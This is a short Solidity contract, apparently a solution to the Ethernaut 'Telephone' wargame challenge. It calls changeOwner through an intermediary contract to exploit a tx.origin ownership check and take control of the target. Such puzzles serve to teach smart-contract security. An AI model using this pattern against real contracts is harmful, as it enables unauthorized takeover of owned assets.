pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack {
    Telephone telephoneContract;

    constructor(Telephone _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
